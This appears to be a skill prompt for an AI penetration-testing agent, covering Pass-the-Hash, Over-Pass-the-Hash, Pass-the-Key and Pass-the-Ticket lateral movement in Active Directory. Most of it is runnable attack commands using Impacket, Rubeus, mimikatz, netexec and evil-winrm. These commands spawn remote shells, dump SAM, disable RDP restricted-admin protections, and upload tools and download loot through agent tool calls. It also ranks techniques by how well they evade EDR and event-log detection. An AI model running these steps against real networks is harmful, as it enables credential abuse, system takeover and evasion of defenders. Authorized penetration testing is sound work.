---
name: pass-the-hash
description: >
  Authenticates to AD services using NTLM hashes, AES keys, or Kerberos
  tickets without cracking passwords. Covers Pass-the-Hash,
  Over-Pass-the-Hash, Pass-the-Key, and Pass-the-Ticket for lateral movement.
keywords:
  - pass the hash
  - PTH
  - over-pass-the-hash
  - pass the key
  - pass the ticket
  - NTLM hash lateral
  - use hash to authenticate
  - lateral movement
  - ptt
  - opth
  - ccache
tools:
  - Impacket
  - Rubeus
  - mimikatz
  - netexec
  - evil-winrm
opsec: medium
---

# Pass the Hash / Over-Pass-the-Hash / Pass the Key / Pass the Ticket

You are helping a penetration tester use credential material (NTLM hashes,
AES keys, or Kerberos tickets) for lateral movement without knowing cleartext
passwords. All testing is under explicit written authorization.

**Kerberos-first authentication**: This skill defaults to converting credential
material into Kerberos tickets (Over-Pass-the-Hash / Pass-the-Key) rather than
using NTLM directly. Direct Pass-the-Hash is the last resort due to heavy
detection (Event 4776, CrowdStrike Identity Module PTH signatures).

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[pass-the-hash] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Credential material: NTLM hash, AES128/AES256 key, or Kerberos ticket (.ccache/.kirbi)
- Network access to target host(s)
- Tools: Impacket suite, `netexec` (nxc), optionally `Rubeus`, `mimikatz`,
  `evil-winrm`

**Kerberos-first workflow** (default for all techniques):

```bash
# Convert hash/key to TGT first, then use Kerberos for everything
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH
# or with AES key (most OPSEC-safe)
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -aesKey AES256_KEY

export KRB5CCNAME=user.ccache

# All lateral movement uses -k -no-pass from here
psexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
```

## Step 1: Assess Credential Material

Determine what you have and choose the appropriate technique:

| Material | Technique | OPSEC | Go To |
|----------|-----------|-------|-------|
| AES256 key | Pass-the-Key | **LOW** — matches normal Kerberos | Step 2 |
| AES128 key | Pass-the-Key | **LOW** — matches normal Kerberos | Step 2 |
| NTLM hash | Over-Pass-the-Hash | **MEDIUM** — RC4 etype is anomalous | Step 3 |
| .ccache / .kirbi ticket | Pass-the-Ticket | **LOW** — reusing real ticket | Step 4 |
| NTLM hash + no Kerberos | Direct Pass-the-Hash | **HIGH** — NTLM auth, heavily monitored | Step 5 |

**Always prefer AES keys > tickets > OPTH > direct PTH.**

## Step 2: Pass-the-Key (AES — Most OPSEC-Safe)

Use AES keys to request a TGT. This generates Event 4768 with encryption
type `0x12` (AES256) or `0x11` (AES128) — indistinguishable from normal
Windows authentication.

### Impacket (Linux)

```bash
# AES256 key -> TGT
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL \
  -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574

export KRB5CCNAME=user.ccache

# Now use Kerberos auth for lateral movement
psexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
smbexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
wmiexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
```

### Rubeus (Windows)

```powershell
# AES256 with /opsec flag — mimics legitimate Windows behavior
.\Rubeus.exe asktgt /user:Administrator /domain:DOMAIN.LOCAL \
  /aes256:2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 \
  /opsec /ptt /nowrap

# AES128
.\Rubeus.exe asktgt /user:Administrator /domain:DOMAIN.LOCAL \
  /aes128:bc09f84dcb4eabccb981a9f265035a72 /ptt /nowrap

# Verify ticket is loaded
klist
```

## Step 3: Over-Pass-the-Hash (NTLM -> Kerberos TGT)

Convert an NTLM hash into a Kerberos TGT. The TGT request uses RC4 encryption
(etype 23), which is **anomalous in AES-hardened domains** but still better
than direct NTLM authentication.

### Impacket (Linux) — Preferred

```bash
# NTLM hash -> TGT
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH

# Full LM:NT format also works
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL \
  -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

export KRB5CCNAME=user.ccache

# Verify ticket
klist -c user.ccache

# Lateral movement via Kerberos
psexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
smbexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
wmiexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
```

### Alternative: ktutil + kinit (Native Kerberos)

```bash
ktutil -k ~/mykeys add -p user@DOMAIN.LOCAL -e arcfour-hmac-md5 \
  -w NTHASH --hex -V 5
kinit -t ~/mykeys user@DOMAIN.LOCAL
klist
```

### Rubeus (Windows)

```powershell
# NTLM hash -> TGT injected into current session
.\Rubeus.exe asktgt /user:Administrator /domain:DOMAIN.LOCAL \
  /rc4:NTHASH /ptt /nowrap

# Create sacrificial process with the ticket (avoids overwriting current TGT)
.\Rubeus.exe asktgt /user:Administrator /domain:DOMAIN.LOCAL \
  /rc4:NTHASH /createnetonly:C:\Windows\System32\cmd.exe /show

# Then lateral movement
.\PsExec.exe -accepteula \\TARGET.DOMAIN.LOCAL cmd
```

### Mimikatz (Windows)

```
# Spawns a new process with the hash injected
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH
```

### OPSEC Note

Over-Pass-the-Hash generates **Event 4768** with encryption type `0x17` (RC4).
In domains where AES is enforced, RC4 TGT requests are a high-fidelity
detection indicator. If AES keys are available, use Pass-the-Key (Step 2) instead.

## Step 4: Pass-the-Ticket (Inject Existing Ticket)

Use when you have a stolen or forged Kerberos ticket (.ccache or .kirbi).

### Ticket Format Conversion

```bash
# ccache -> kirbi (for use on Windows)
python ticket_converter.py user.ccache user.kirbi

# kirbi -> ccache (for use on Linux)
python ticket_converter.py user.kirbi user.ccache

# Impacket ticketConverter
ticketConverter.py user.kirbi user.ccache
ticketConverter.py user.ccache user.kirbi
```

### Linux — ccache

```bash
# Set the ccache file
export KRB5CCNAME=/path/to/ticket.ccache

# Verify
klist

# Use with any Kerberos-aware tool
psexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
smbexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass
wmiexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass

# NetExec
nxc smb TARGET.DOMAIN.LOCAL --use-kcache -x "whoami"
```

### Windows — kirbi

```powershell
# Rubeus — inject ticket
.\Rubeus.exe ptt /ticket:user.kirbi

# Mimikatz — inject ticket
kerberos::ptt user.kirbi

# Verify
klist

# Lateral movement
.\PsExec.exe -accepteula \\TARGET.DOMAIN.LOCAL cmd
dir \\TARGET.DOMAIN.LOCAL\C$
```

### OPSEC Note

Pass-the-Ticket is pure Kerberos and avoids NTLM detection entirely. It's
hard to detect because you're reusing a legitimate ticket. The main risk is
that the ticket may be logged as coming from an unexpected source IP.

## Step 5: Direct Pass-the-Hash (NTLM — Last Resort)

Use only when Kerberos is unavailable (e.g., no access to port 88, target
not joined to domain, or NTLM-only service). This triggers **Event 4776**
and CrowdStrike Identity Module PTH signatures.

### NetExec

```bash
# SMB with NTLM hash
nxc smb TARGET -u Administrator -H 'aad3b435b51404ee:NTHASH' -d DOMAIN.LOCAL -x "whoami"

# Check for local admin (Pwn3d!)
nxc smb 10.10.10.0/24 -u Administrator -H ':NTHASH' -d DOMAIN.LOCAL

# Local authentication (non-domain)
nxc smb TARGET -u Administrator -H ':NTHASH' --local-auth
```

### Impacket (Direct Hash Auth)

```bash
# psexec — creates a service (noisy)
psexec.py DOMAIN/Administrator@TARGET -hashes :NTHASH

# smbexec — creates a service (slightly less noisy)
smbexec.py DOMAIN/Administrator@TARGET -hashes :NTHASH

# wmiexec — WMI-based (less artifacts)
wmiexec.py DOMAIN/Administrator@TARGET -hashes :NTHASH

# atexec — Task Scheduler
atexec.py DOMAIN/Administrator@TARGET -hashes :NTHASH 'whoami'

# dcomexec — DCOM objects
dcomexec.py DOMAIN/Administrator@TARGET -hashes :NTHASH
```

### Mimikatz (Spawn Process)

```
# Spawns cmd.exe with NTLM hash injected into logon session
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH
```

### PTH for RDP (Restricted Admin Mode)

```
# Mimikatz — RDP with hash (target must have RestrictedAdmin enabled)
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:"mstsc.exe /restrictedadmin"
```

```bash
# Enable Restricted Admin remotely (requires admin access)
nxc smb TARGET -u Administrator -H ':NTHASH' -x 'reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'

# Then connect with xfreerdp
xfreerdp /u:Administrator /pth:NTHASH /v:TARGET /d:DOMAIN.LOCAL
```

### OPSEC Warning

Direct PTH is the **most detectable** technique:
- Event 4776 (NTLM credential validation)
- Event 4624 type 3 (network logon)
- CrowdStrike Identity Module flags PTH patterns
- psexec creates a service (Event 7045) — very noisy
- Prefer wmiexec over psexec if you must use NTLM

## Step 6: Lateral Movement

After establishing authentication (via any method above), use these tools
for command execution and access.

### Impacket Suite (All support `-k -no-pass` and `-hashes`)

| Tool | Protocol | Noise Level | Notes |
|------|----------|-------------|-------|
| `psexec.py` | SMB (service) | High | Creates/starts a service |
| `smbexec.py` | SMB (service) | High | Similar to psexec |
| `wmiexec.py` | WMI/DCOM | Medium | No service creation |
| `atexec.py` | Task Scheduler | Medium | Creates scheduled task |
| `dcomexec.py` | DCOM | Medium | Various DCOM objects |

```bash
# Preferred: wmiexec with Kerberos (lowest noise)
wmiexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass

# Semi-interactive shell
smbexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass

# Execute single command
atexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass 'whoami /all'
```

### NetExec (Multi-Purpose)

```bash
# Command execution
nxc smb TARGET.DOMAIN.LOCAL --use-kcache -x "whoami"

# Module execution
nxc smb TARGET.DOMAIN.LOCAL --use-kcache -M mimikatz

# SAM dump (if local admin)
nxc smb TARGET.DOMAIN.LOCAL --use-kcache --sam

# Share enumeration
nxc smb TARGET.DOMAIN.LOCAL --use-kcache --shares
```

### Evil-WinRM (WinRM Shell — Port 5985/5986)

```bash
# With password
evil-winrm -i TARGET.DOMAIN.LOCAL -u Administrator -p 'Password123'

# With hash
evil-winrm -i TARGET.DOMAIN.LOCAL -u Administrator -H NTHASH
```

**Via `start_process` (preferred for persistent sessions):**

```python
# Spawn evil-winrm in a persistent PTY
start_process(command="evil-winrm -i TARGET -u Administrator -H NTHASH", label="ewrm-target")

# Interact via send_command
send_command(session_id=..., command="whoami")
```

**File transfer via evil-winrm (preferred on Windows):** Evil-WinRM's built-in
`upload` and `download` commands are more reliable than SMB file transfer for
moving tools, scripts, and loot to/from Windows targets:

```
# Upload tools to target
send_command(session_id=..., command="upload /opt/tools/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe")

# Download loot
send_command(session_id=..., command="download C:\\Users\\Administrator\\Desktop\\root.txt ./root.txt")
```

### Impacket via `start_process`

For interactive Impacket shells (psexec.py, wmiexec.py, smbexec.py), use
`start_process` to maintain session persistence:

```python
# Interactive psexec shell (port 445)
start_process(command="psexec.py DOMAIN/user@TARGET -k -no-pass", label="psexec-target")

# Interactive wmiexec shell (port 135 — less noisy)
start_process(command="wmiexec.py DOMAIN/user@TARGET -k -no-pass", label="wmiexec-target")

# With hash directly
start_process(command="wmiexec.py DOMAIN/Administrator@TARGET -hashes :NTHASH", label="wmiexec-target")
```

### Verify Access

```bash
# Check what you can access
nxc smb 10.10.10.0/24 --use-kcache
# (Pwn3d!) = local admin

# List shares
nxc smb TARGET.DOMAIN.LOCAL --use-kcache --shares

# Check who you are
wmiexec.py DOMAIN/user@TARGET.DOMAIN.LOCAL -k -no-pass 'whoami /all'
```

## Step 7: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### KDC Cannot Find the Name / PyAsn1Error

- Use **FQDN hostnames**, not IP addresses. Kerberos requires proper DNS.
- Add entries to `/etc/hosts` if DNS doesn't resolve:
  ```
  10.10.10.10  DC01.DOMAIN.LOCAL DOMAIN.LOCAL
  ```
- Update Impacket if you see `PyAsn1Error` — older versions have encoding bugs.

### PTH Fails with STATUS_LOGON_FAILURE

- Verify the hash is correct (try against the source machine first)
- Since Windows Vista, PTH to local admin accounts is blocked unless the
  account is the **builtin RID 500 Administrator** (UAC remote restriction)
- Try `--local-auth` with NetExec for local accounts
- Non-RID-500 local admins need the `LocalAccountTokenFilterPolicy` registry
  key set to 1

### Ticket Expired

- Kerberos TGTs have a default lifetime of 10 hours
- Re-request with `getTGT.py` if expired
- Check with `klist -c ticket.ccache` to see expiration

### Evil-WinRM Connection Refused

- Port 5985 (HTTP) or 5986 (HTTPS) must be open
- WinRM may not be enabled on all hosts
- Try `nxc winrm TARGET` to check availability first

### OPSEC Comparison Summary

| Technique | Auth Protocol | Detection Event | EDR Risk |
|-----------|--------------|-----------------|----------|
| Pass-the-Key (AES256) | Kerberos | 4768 (etype 0x12) | **LOW** |
| Pass-the-Ticket | Kerberos | — (reuse existing) | **LOW** |
| Over-Pass-the-Hash (RC4) | Kerberos | 4768 (etype 0x17) | **MEDIUM** |
| Direct PTH | NTLM | 4776, 4624 type 3 | **HIGH** |
| psexec lateral | SMB | 7045 (service created) | **VERY HIGH** |
| wmiexec lateral | WMI/DCOM | 4688 (process created) | **MEDIUM** |
